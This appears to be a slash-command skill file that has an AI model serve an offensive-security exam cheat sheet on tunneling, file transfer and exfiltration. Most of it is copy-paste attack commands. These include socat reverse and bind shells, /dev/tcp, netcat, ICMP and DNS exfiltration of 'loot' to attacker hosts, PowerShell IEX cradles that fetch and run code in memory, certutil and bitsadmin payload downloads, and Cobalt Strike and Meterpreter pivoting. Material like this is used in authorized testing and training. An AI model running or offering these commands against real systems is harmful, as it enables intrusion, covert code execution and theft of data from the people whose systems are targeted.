# Trigger
User says `/osai-transfer` followed by an optional category.

Categories: ligolo, chisel, ssh, dns, icmp, cloud, socat, netsh, meterpreter, proxychains, download, upload, smb, ftp, exfil, capture

$ARGUMENTS = optional category filter. If empty, list all categories with one-line description and ask which one.

# Purpose
Tunneling, file transfer, and exfiltration cheat sheet for OSAI exam. Copy-paste ready.

# Steps

## If no category specified, print this menu:
```
OSAI TUNNELING / FILE TRANSFER / EXFIL CHEAT SHEET
  ligolo      — Ligolo-ng (agent, proxy, routes, listeners)
  chisel      — Chisel (reverse SOCKS, forward SOCKS, port forward)
  ssh         — SSH tunneling (local/remote/dynamic, sshuttle, VPN, Konami)
  dns         — DNS tunneling (Iodine, DNSCat2)
  icmp        — ICMP tunneling (Hans, ptunnel-ng)
  cloud       — Cloud tunnels (ngrok, Cloudflared, FRP)
  socat       — Socat (relays, SSL tunnels, port forward)
  netsh       — Windows netsh port proxy + plink
  meterpreter — Meterpreter pivoting (portfwd, autoroute, SOCKS)
  proxychains — Proxychains config + nmap through proxy
  download    — File download methods (PS cradles, certutil, bitsadmin, wget, curl)
  upload      — File upload to attacker (Python uploadserver, HTTP/S)
  smb         — SMB file transfer (impacket-smbserver, samba, net use)
  ftp         — FTP/TFTP file transfer
  exfil       — Exfiltration (DNS, ICMP, HTTPS, QUIC/H3, cloud presigned, Discord)
  capture     — Network capture (tcpdump, netsh trace)

Usage: /osai-transfer ligolo
```

---

## Category: ligolo

### Attacker (proxy)
```bash
sudo ./proxy -selfcert
# or with auto TLS:
./proxy -autocert
```

### Victim (agent)
```bash
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
```

### Session management (on proxy)
```
session                                                    # list sessions
1                                                          # select session
tunnel_start --tun "ligolo"                                # start tunnel
ifconfig                                                   # show interfaces
interface_create --name "ligolo"                           # create TUN
interface_add_route --name "ligolo" --route <network>/24   # add route
interface_list                                             # verify
```

### Listener (forward port from agent to proxy)
```
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
listener_list
```

### Access agent local services
```
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

---

## Category: chisel

### Reverse SOCKS (most common)
```bash
# Attacker:
./chisel server -p 8080 --reverse
# Victim:
./chisel client KALI:8080 R:socks
```

### Forward SOCKS
```bash
# Victim:
./chisel server -v -p 8080 --socks5
# Attacker:
./chisel client -v VICTIM:8080 socks
```

### Port forwarding
```bash
# Attacker:
./chisel server -p 12312 --reverse
# Victim (forward victim 4505 to attacker 4505):
./chisel client KALI:12312 R:4505:127.0.0.1:4505
```

---

## Category: ssh

### Local port forward
```bash
ssh -L <local_port>:<target_ip>:<target_port> user@pivot [-N -f]
sudo ssh -L 631:<victim_ip>:631 -N -f -l user pivot_ip
```

### Remote port forward
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1
```

### Dynamic SOCKS proxy
```bash
ssh -f -N -D <local_port> user@pivot
ssh -N -f -D 1080 user@pivot
```

### Reverse port forward through DMZ
```bash
ssh -i dmz_key -R <dmz_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
```

### SSH VPN tunnel (requires PermitRootLogin + PermitTunnel)
```bash
ssh root@server -w any:any
# Server:
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0; ip link set tun0 up
# Client:
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0; ip link set tun0 up
# Server NAT:
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

### SSH "Konami Code" (add forward inside existing session)
```
~C
-L 1080:127.0.0.1:1080
```

### sshuttle (VPN-like, no admin on pivot)
```bash
sshuttle -r user@pivot 10.10.10.0/24
sshuttle -vvr user@pivot 10.1.1.0/24
sshuttle -vvr root@pivot 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
sshuttle -D -r user@pivot 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
```

### X11 forwarding
```bash
ssh -Y -C user@host
```

---

## Category: dns

### Iodine
```bash
# Attacker:
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
# Victim:
iodine -f -P P@ssw0rd tunneldomain.com -r
# Then SSH through tunnel:
ssh user@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2
```bash
# Attacker:
ruby ./dnscat2.rb tunneldomain.com
# Victim:
./dnscat2 tunneldomain.com

# Internal network:
ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
./dnscat2 --dns host=10.10.10.10,port=5353

# PowerShell client:
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd

# Port forward inside dnscat2:
session -i <session_id>
listen [lhost:]lport rhost:rport
```

---

## Category: icmp

### Hans
```bash
# Server:
./hans -v -f -s 1.1.1.1 -p P@ssw0rd
# Client:
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100
```

### ptunnel-ng
```bash
# Server (victim):
sudo ptunnel-ng
# Client (attacker):
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
ssh -p 2222 -l user 127.0.0.1
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

---

## Category: cloud

### ngrok
```bash
./ngrok tcp 4444
# Listener:
nc -nvlp 4444
# Connect:
nc $(dig +short 0.tcp.ngrok.io) 12345

# HTTP file server:
./ngrok http file:///tmp/httpbin/

# HTTP with auth:
./ngrok http localhost:8080 --host-header=rewrite --auth="user:pass"
```

ngrok YAML multi-tunnel:
```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

### Cloudflared
```bash
# Quick tunnel (no account needed):
cloudflared tunnel --url http://localhost:8080
# Persistent tunnel:
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
cloudflared tunnel run mytunnel
```

### FRP (Fast Reverse Proxy)
```bash
# Server:
./frps -c frps.toml
# Client:
./frpc -c frpc.toml
```

frpc.toml:
```toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

SSH gateway (no frpc binary needed):
```bash
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

---

## Category: socat

### Port relay
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<target_ip>:<rport> &
```

### Port through SOCKS
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Bind shell
```bash
# Victim:
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
# Attacker:
socat FILE:`tty`,raw,echo=0 TCP4:<victim>:1337
```

### Reverse shell
```bash
# Attacker:
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
# Victim:
socat TCP4:<attacker>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### SSL tunnel
```bash
# Generate cert:
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem

# Listener:
socat OPENSSL-LISTEN:443,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
# Connect:
socat STDIO OPENSSL-CONNECT:localhost:443,cert=client.pem,cafile=server.crt
```

### Remote Port2Port via SSH
```bash
# Attacker:
sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
# Victim:
while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22; done
# Connect:
ssh localhost -p 2222 -l www-data -i vulnerable_key
```

---

## Category: netsh

### Windows port proxy
```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Firewall rules for forwarded ports
```powershell
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
```

### Plink (PuTTY)
```cmd
echo y | plink.exe -l root -pw password -R 9090:127.0.0.1:9090 KALI
plink -R [remote_port]:localhost:[local_port] [VPS_IP]
```

### Bash relay (jump server)
```bash
mknod backpipe p
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe
```

---

## Category: meterpreter

### Port forward
```
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
```

### SOCKS via autoroute
```
background
use post/multi/manage/autoroute
set SESSION <session>
set SUBNET <net_ip>
set NETMASK <mask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run
```
Then: `echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf`

### SOCKS via route
```
route add <victim_ip> <netmask> <session>
use auxiliary/server/socks_proxy
run
```

### Cobalt Strike
```
beacon> socks 1080
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
rportfwd [bind_port] [fwd_host] [fwd_port]
rportfwd_local [bind_port] [fwd_host] [fwd_port]
```

---

## Category: proxychains

### Config (/etc/proxychains.conf)
```
[ProxyList]
socks5 localhost 1080
```

### Usage
```bash
proxychains nmap -Pn -sT <target>
proxychains curl http://target
proxychains evil-winrm -u admin -i target
```

### Nmap through proxy (must use -sT)
```bash
nmap -Pn -sT <target>   # TCP connect scan required, no SYN scan
```

### SocksOverRDP
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
# Connect via mstsc.exe
# On victim:
SocksOverRDP-Server.exe
# Verify:
netstat -antb | findstr 1080
```

### gost chaining
```bash
gost -L=tcp://:2222/192.168.1.1:22
gost -L=socks5://:1080
gost -L=:8080 -F=socks5://server_ip:1080?notls=true
```

### wstunnel (WebSocket tunneling)
```bash
wstunnel server wss://[::]:8080
wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://remote:8080
curl -x socks5h://127.0.0.1:8888 http://google.com/
```

### revsocks
```bash
# Server (attacker):
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls -ws
# Client (victim):
revsocks -connect https://KALI:8443 -pass SuperSecretPassword -ws
```

---

## Category: download

### PowerShell
```powershell
(New-Object Net.WebClient).DownloadFile("http://KALI/file.exe","C:\Windows\Temp\file.exe")
Invoke-WebRequest "http://KALI/file.exe" -OutFile "C:\Temp\file.exe"
wget "http://KALI/file.exe" -OutFile "C:\Temp\file.exe"
```

### PowerShell in-memory (no file on disk)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')
IEX (Invoke-WebRequest -Uri 'http://KALI/script.ps1' -UseBasicParsing).Content
```

### PowerShell assembly in memory
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://KALI/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast".Split())
```

### Certutil
```cmd
certutil -urlcache -split -f http://KALI/file.exe C:\Temp\file.exe
certutil -urlcache -split -f http://KALI/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe
```

### Bitsadmin
```cmd
bitsadmin /transfer job /download /priority high http://KALI/file.exe C:\Temp\file.exe
```

### BitsTransfer (PowerShell)
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://KALI/file.exe" -Destination "C:\Temp\file.exe"
```

### Linux
```bash
wget http://KALI/file -O /tmp/file
curl http://KALI/file -o /tmp/file
```

### WebDAV
```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
cmd.exe /k < \\webdavserver\folder\batchfile.txt
cscript //E:jscript \\webdavserver\folder\payload.txt
```

---

## Category: upload

### Python upload server
```bash
python3 -m pip install uploadserver
python3 -m uploadserver
python3 -m uploadserver --basic-auth hello:world
```

Upload from target:
```bash
curl -X POST http://KALI:8000/upload -F 'files=@file.txt'
curl -X POST http://KALI:8000/upload -F 'files=@file.txt' -u hello:world
```

### HTTPS server (Python)
```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
"
```

### goshs (multi-protocol)
```bash
goshs                              # HTTP on 8000
goshs -s -ss                       # HTTPS self-signed
goshs -b user:password             # basic auth
goshs -uo                          # upload-only
goshs -ro                          # read-only
goshs -smb -smb-domain CORP        # SMB + hash capture
```

---

## Category: smb

### Impacket SMB server
```bash
impacket-smbserver -smb2support share `pwd`
impacket-smbserver -smb2support -user test -password test share `pwd`
```

### Connect from Windows
```powershell
\\KALI\share\file.exe
net use z: \\KALI\share /user:test test
copy \\KALI\share\file.exe C:\Temp\file.exe
New-PSDrive -Name "k" -PSProvider "FileSystem" -Root "\\KALI\share"
```

### Samba (persistent)
```bash
apt-get install samba
mkdir /tmp/smb; chmod 777 /tmp/smb
# /etc/samba/smb.conf:
# [public]
#     path = /tmp/smb
#     read only = no
#     browsable = yes
#     guest ok = Yes
service smbd restart
```

---

## Category: ftp

### Python FTP server
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Windows FTP script
```cmd
echo open KALI 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

### TFTP
```bash
# Server (Kali):
atftpd --daemon --port 69 /tftp
# or Python:
pip install ptftpd
ptftpd -p 69 tap0 .

# Client (Windows):
tftp -i KALI get file.exe
```

### SCP
```bash
scp user@KALI:/path/file /tmp/file
scp /tmp/loot user@KALI:/loot/
```

### SSHFS
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions user@target:/path /mnt/sshfs/
```

---

## Category: exfil

### Base64 encode/decode
```bash
# Linux:
base64 -w0 <file>; base64 -d file
# Windows:
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

### Netcat
```bash
# Receiver:
nc -lvnp 4444 > file
# Sender:
nc -vn KALI 4444 < file
```

### /dev/tcp
```bash
# Download from victim:
nc -lvnp 80 > file                    # on attacker
cat /path/file > /dev/tcp/KALI/80     # on victim

# Upload to victim:
nc -w5 -lvnp 80 < file               # on attacker
exec 6< /dev/tcp/KALI/80; cat <&6 > file  # on victim
```

### ICMP exfiltration
```bash
xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line KALI; done
```

Scapy ICMP receiver:
```python
from scapy.all import *
def process_packet(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 0:
        data = pkt[ICMP].load[-4:]
        print(f"{data.decode('utf-8')}", flush=True, end="")
sniff(iface="tun0", prn=process_packet)
```

### DNS exfiltration (over HTTPS)
```bash
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" >/dev/null
  done
```

### HTTP/3 / QUIC exfiltration
```bash
curl --http3-only -T loot.7z https://attacker-h3.example/upload
curl --http3 -T loot.7z https://attacker-h3.example/upload
```

### Pre-signed cloud upload
```bash
# AWS S3:
curl -X PUT -T loot.7z -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
# Azure Blob SAS:
curl -X PUT --data-binary @loot.7z -H 'x-ms-blob-type: BlockBlob' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

### Rclone (cloud exfil)
```bash
rclone config   # create remote + crypt wrapper
rclone copy /loot secret:$(hostname)-$(date +%F) --transfers 2 --bwlimit 4M
```

### SMTP
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### PHP download
```php
<?php file_put_contents('nameOfFile', fopen('http://KALI/file', 'r')); ?>
```

---

## Category: capture

### tcpdump
```bash
tcpdump -w capture.pcap -i eth0
tcpdump -A -i eth0                     # ASCII
tcpdump -i eth0 tcp port 22
```

### Windows netsh trace
```powershell
netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
netsh trace stop
# Filter by IP:
netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
# Convert:
etl2pcapng.exe c:\trace.etl c:\trace.pcapng
```

# Token discipline
Print ONLY the requested category. Never dump the entire cheat sheet unless user asks for all.
